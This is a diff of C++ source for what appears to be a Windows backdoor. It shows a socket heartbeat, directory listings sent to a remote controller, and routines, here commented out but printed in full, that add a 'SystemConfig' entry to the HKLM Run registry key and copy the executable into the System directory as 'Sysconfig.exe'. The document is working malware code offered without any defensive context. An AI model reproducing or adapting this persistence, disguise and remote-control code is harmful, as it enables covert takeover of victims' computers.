@@ -118,13 +118,13 @@ bool TcharToChar(const TCHAR* tchar, char* _char)
 
 bool HeartBeat(SOCKET fd)
 {
-	char buf[20] = "\nAlive\n";
-	encode(buf);
+	char buf[20] = "\nAlive";
+	//encode(buf);
 	while (true)
 	{
 		send(fd, buf, 20, 0);
 		//cout << buf << endl;
-		Sleep(10000);
+		Sleep(60000);
 	}
 	return false;
 }
@@ -281,87 +281,88 @@ void decode(char* pwd)
 	base32decode(pwd, strlen(pwd));
 }
 
-void GetFileName(SOCKET fd, char FileName[Row], char* str)
+void GetFileName(SOCKET fd, char* command, char* res)
 {
-	intptr_t Handle;
+	long long Handle;
 	struct _finddata_t FileInfo;
-	string path(str);
+	string path(command);
 	Handle = _findfirst(path.append("\\*").c_str(), &FileInfo);
 	while (_findnext(Handle, &FileInfo) == 0)
 	{
-		strcpy(FileName, FileInfo.name);
-		cout << FileName << endl;
-		send(fd, FileName, Row, 0);
-		ZeroMemory(FileName, sizeof(FileName));
+		strcpy(res, FileInfo.name);
+		cout << res << endl;
+		send(fd, res, BUFSIZ, 0);
+		ZeroMemory(res, sizeof(res));
 	}
-	send(fd, FileName, Row, 0);
 	_findclose(Handle);
 }
 
-int ComputerStart(char* pathName)
-{
-	HKEY hKey;
-	DWORD result;
 
-	//打开注册表
-	result = RegOpenKeyEx(
-		HKEY_LOCAL_MACHINE,
-		(LPCWSTR)(CString)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", // 要打开的注册表项名称
-		0,              // 保留参数必须填 0
-		KEY_SET_VALUE,  // 打开权限，写入
-		&hKey           // 打开之后的句柄
-	);
 
-	if (result != ERROR_SUCCESS)
-	{
-		return 0;
-	}
-	// 在注册表中设置(没有则会新增一个值)
-	result = RegSetValueEx(
-		hKey,
-		(LPCWSTR)(CString)"SystemConfig", // 键名
-		0,                  // 保留参数必须填 0
-		REG_SZ,             // 键值类型为字符串
-		(const unsigned char*)pathName, // 字符串首地址
-		strlen(pathName)        // 字符串长度
-	);
-
-	if (result != ERROR_SUCCESS)
-	{
-		return 0;
-	}
-	//关闭注册表:
-	RegCloseKey(hKey);
-}
-
-LPWSTR CharToLPWSTR(const char* szString)
-{
-	int dwLen = strlen(szString) + 1;
-
-	int nwLen = MultiByteToWideChar(CP_ACP, 0, szString, dwLen, NULL, 0);//算出合适的长度
-
-	LPWSTR lpszPath = new WCHAR[dwLen];
-
-	MultiByteToWideChar(CP_ACP, 0, szString, dwLen, lpszPath, nwLen);
-
-	return lpszPath;
-}
-
-int copySelf(char* path)
-{
-	TCHAR fileName[MAX_PATH];
-	TCHAR sysPath[MAX_PATH];
-	char filename[MAX_PATH] = { 0 };
-	char syspath[MAX_PATH] = { 0 };
-	//获得该文件的完整路径
-	GetModuleFileName(NULL, fileName, MAX_PATH);
-	//取得System目录的完整路径名，写入sysPath
-	GetSystemDirectory(sysPath, MAX_PATH);
-	TcharToChar(fileName, filename);
-	TcharToChar(sysPath, syspath);
-	sprintf(path, "%s\\Sysconfig.exe", syspath);
-	LPWSTR Path = CharToLPWSTR(path);
-	//将文件复制到系统目录
-	CopyFile(fileName, Path, FALSE);
-	return 0;
-}
+//int ComputerStart(char* pathName)
+//{
+//	HKEY hKey;
+//	DWORD result;
+//
+//	//打开注册表
+//	result = RegOpenKeyEx(
+//		HKEY_LOCAL_MACHINE,
+//		(LPCWSTR)(CString)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", // 要打开的注册表项名称
+//		0,              // 保留参数必须填 0
+//		KEY_SET_VALUE,  // 打开权限，写入
+//		&hKey           // 打开之后的句柄
+//	);
+//
+//	if (result != ERROR_SUCCESS)
+//	{
+//		return 0;
+//	}
+//	// 在注册表中设置(没有则会新增一个值)
+//	result = RegSetValueEx(
+//		hKey,
+//		(LPCWSTR)(CString)"SystemConfig", // 键名
+//		0,                  // 保留参数必须填 0
+//		REG_SZ,             // 键值类型为字符串
+//		(const unsigned char*)pathName, // 字符串首地址
+//		strlen(pathName)        // 字符串长度
+//	);
+//
+//	if (result != ERROR_SUCCESS)
+//	{
+//		return 0;
+//	}
+//	//关闭注册表:
+//	RegCloseKey(hKey);
+//}
+//
+//LPWSTR CharToLPWSTR(const char* szString)
+//{
+//	int dwLen = strlen(szString) + 1;
+//
+//	int nwLen = MultiByteToWideChar(CP_ACP, 0, szString, dwLen, NULL, 0);//算出合适的长度
+//
+//	LPWSTR lpszPath = new WCHAR[dwLen];
+//
+//	MultiByteToWideChar(CP_ACP, 0, szString, dwLen, lpszPath, nwLen);
+//
+//	return lpszPath;
+//}
+//
+//int copySelf(char* path)
+//{
+//	TCHAR fileName[MAX_PATH];
+//	TCHAR sysPath[MAX_PATH];
+//	char filename[MAX_PATH] = { 0 };
+//	char syspath[MAX_PATH] = { 0 };
+//	//获得该文件的完整路径
+//	GetModuleFileName(NULL, fileName, MAX_PATH);
+//	//取得System目录的完整路径名，写入sysPath
+//	GetSystemDirectory(sysPath, MAX_PATH);
+//	TcharToChar(fileName, filename);
+//	TcharToChar(sysPath, syspath);
+//	sprintf(path, "%s\\Sysconfig.exe", syspath);
+//	LPWSTR Path = CharToLPWSTR(path);
+//	//将文件复制到系统目录
+//	CopyFile(fileName, Path, FALSE);
+//	return 0;
+//}
